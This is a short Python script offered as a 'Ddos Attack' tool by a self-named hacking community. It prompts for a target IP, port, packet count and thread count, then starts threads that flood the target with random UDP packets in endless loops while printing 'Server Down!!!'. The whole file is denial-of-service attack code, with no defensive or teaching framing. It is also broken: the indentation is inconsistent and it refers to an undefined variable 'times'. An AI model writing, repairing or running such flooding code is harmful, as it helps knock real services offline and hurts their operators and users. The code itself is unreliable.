#Create by VilL`
#Rex Riot Community
#Credits VilL`

import random

import socket

import time

import os

import threading

import sys

os.system("clear")
 print("""\033[35 
 color={008000FF}""")
  
  print("""\033[35m
      →_→ Ddos Attack ←_←
                                    """)
  
    print("""\033[35m
      →_→ Sang creator Gabut ←_←
                                   """)
 
  print("""\033[34m
  ================================""")
  
    print("""\033[35m
    [✓] Author : VilL` (Alpin)
    [✓] Discord : 
    [✓] Team : Rex Riot Community""")

  print("""\033[36m 
  ================================""")
 
 ip =str(input("\033[32m >>> \033[39m [~] IP TARGET : "))
port =int(input("\033[32m >>> \033[39m [~] PORT TARGET : "))
time =int(input("\033[32m >>> \033[39m [~] PACKETS : "))
threads =int(input("\033[32m >>> \033[39m [~] THREADS : "))
choice =str(input("\033[32m >>> \033[39m [~] Serang Ga? (y/n) : "))

def ddos():

	data = random._urandom(577)

	i = random.choice(("[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[32m Server Down!!!")
		except:
			print("\033[91m[•]\u001b[32m Server Down!!!")
	
def ddos2():

	data = random._urandom(17)

	i = random.choice(("[•]"))
  while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[32m Server Down!!!")
		except:
		  s.close()
			print("\033[91m[•]\u001b[32m Server Down!!!")
			
def ddos3():

	data = random._urandom(1025)

	i = random.choice(("[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[32m Server Down!!!")
		except:
		  s.close()
			print("\033[91m[•]\u001b[32m Server Down!!!")
			  
for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()